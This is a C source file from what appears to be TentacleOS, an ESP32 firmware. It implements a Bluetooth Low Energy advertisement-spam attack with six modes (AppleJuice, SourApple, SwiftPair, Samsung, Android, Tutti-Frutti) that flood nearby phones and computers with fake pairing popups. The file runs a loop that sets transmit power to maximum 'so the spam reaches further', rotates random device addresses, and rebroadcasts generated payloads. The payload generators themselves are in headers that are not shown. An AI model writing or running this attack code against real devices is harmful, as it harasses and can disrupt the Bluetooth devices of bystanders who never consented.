// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

// BLE Spam Indices:
// 0: AppleJuice (Airpods, Beats, etc)
// 1: SourApple (AppleTV Setup, Phone Setup, etc)
// 2: SwiftPair (Microsoft Windows popups)
// 3: Samsung (Samsung Watch/Galaxy popups)
// 4: Android (Google Fast Pair)
// 5: Tutti-Frutti (Cycles through all above)

#include "canned_spam.h"

#include <string.h>

#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "sys_prio.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "host/ble_hs_id.h"

#include "android_spam.h"
#include "apple_juice_spam.h"
#include "bluetooth_service.h"
#include "samsung_spam.h"
#include "sour_apple_spam.h"
#include "swift_pair_spam.h"
#include "tutti_frutti_spam.h"

static const char *TAG = "CANNED_SPAM";

#define SPAM_TASK_STACK_SIZE  4096
#define SPAM_TASK_PRIORITY SYS_PRIO_SERVICE_HI
#define SPAM_ADV_ITVL_MIN     32
#define SPAM_ADV_ITVL_MAX     48
#define SPAM_PAYLOAD_BUF_SIZE 32
#define SPAM_ADV_DELAY_MS     150
#define SPAM_GAP_DELAY_MS     50
#define SPAM_RETRY_DELAY_MS   10
#define SPAM_STOP_POLL_MS     50
#define SPAM_STOP_RETRIES     10

typedef enum {
  CANNED_SPAM_CAT_APPLE_JUICE = 0,
  CANNED_SPAM_CAT_SOUR_APPLE,
  CANNED_SPAM_CAT_SWIFT_PAIR,
  CANNED_SPAM_CAT_SAMSUNG,
  CANNED_SPAM_CAT_ANDROID,
  CANNED_SPAM_CAT_TUTTI_FRUTTI,
  CANNED_SPAM_CAT_COUNT
} canned_spam_category_t;

static const canned_spam_type_t CATEGORY_INFO[] = {
    {"AppleJuice"}, {"SourApple"}, {"SwiftPair"}, {"Samsung"}, {"Android"}, {"Tutti-Frutti"}};

static volatile bool s_is_running = false;
static int s_current_category = -1;
static TaskHandle_t s_spam_task_handle = NULL;

static void spam_task(void *pvParameters);

int spam_get_attack_count(void) {
  return CANNED_SPAM_CAT_COUNT;
}

const canned_spam_type_t *spam_get_attack_type(int index) {
  if (index < 0 || index >= CANNED_SPAM_CAT_COUNT) {
    return NULL;
  }
  return &CATEGORY_INFO[index];
}

esp_err_t spam_start(int attack_index) {
  if (s_is_running) {
    return ESP_ERR_INVALID_STATE;
  }

  if (!bluetooth_service_is_running()) {
    ESP_LOGE(TAG, "Bluetooth service is not running");
    return ESP_FAIL;
  }

  if (attack_index < 0 || attack_index >= CANNED_SPAM_CAT_COUNT) {
    return ESP_ERR_NOT_FOUND;
  }

  bluetooth_service_stop_advertising();

  // Set maximum power so the spam reaches further
  bluetooth_service_set_max_power();

  s_current_category = attack_index;
  s_is_running = true;

  xTaskCreate(
      spam_task, "spam_task", SPAM_TASK_STACK_SIZE, NULL, SPAM_TASK_PRIORITY, &s_spam_task_handle);

  ESP_LOGI(TAG, "Spam started for category: %s", CATEGORY_INFO[attack_index].name);
  return ESP_OK;
}

esp_err_t spam_stop(void) {
  if (!s_is_running) {
    return ESP_ERR_INVALID_STATE;
  }

  s_is_running = false;

  if (s_spam_task_handle != NULL) {
    int retry = SPAM_STOP_RETRIES;
    while (s_spam_task_handle != NULL && retry > 0) {
      vTaskDelay(pdMS_TO_TICKS(SPAM_STOP_POLL_MS));
      retry--;
    }
  }

  if (ble_gap_adv_active()) {
    ble_gap_adv_stop();
  }

  ESP_LOGI(TAG, "Spam stopped");
  return ESP_OK;
}

static void spam_task(void *pvParameters) {
  ESP_LOGI(TAG, "Spam Task Started for category %d", s_current_category);

  struct ble_gap_adv_params adv_params;
  memset(&adv_params, 0, sizeof(adv_params));
  adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
  adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
  adv_params.itvl_min = SPAM_ADV_ITVL_MIN;
  adv_params.itvl_max = SPAM_ADV_ITVL_MAX;

  uint8_t payload_buffer[SPAM_PAYLOAD_BUF_SIZE];

  while (s_is_running) {
    int payload_len = 0;

    switch (s_current_category) {
      case CANNED_SPAM_CAT_APPLE_JUICE:
        payload_len = generate_apple_juice_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CANNED_SPAM_CAT_SOUR_APPLE:
        payload_len = generate_sour_apple_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CANNED_SPAM_CAT_SWIFT_PAIR:
        payload_len = generate_swift_pair_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CANNED_SPAM_CAT_SAMSUNG:
        payload_len = generate_samsung_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CANNED_SPAM_CAT_ANDROID:
        payload_len = generate_android_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CANNED_SPAM_CAT_TUTTI_FRUTTI:
        payload_len = generate_tutti_frutti_payload(payload_buffer, sizeof(payload_buffer));
        break;
      default:
        payload_len = 0;
        break;
    }

    if (payload_len <= 0) {
      vTaskDelay(pdMS_TO_TICKS(SPAM_RETRY_DELAY_MS));
      continue;
    }

    ble_addr_t rnd_addr;
    ble_hs_id_gen_rnd(0, &rnd_addr);
    ble_hs_id_set_rnd(rnd_addr.val);

    ble_gap_adv_set_data(payload_buffer, payload_len);
    ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);

    vTaskDelay(pdMS_TO_TICKS(SPAM_ADV_DELAY_MS));

    ble_gap_adv_stop();

    vTaskDelay(pdMS_TO_TICKS(SPAM_GAP_DELAY_MS));
  }

  s_spam_task_handle = NULL;
  vTaskDelete(NULL);
}
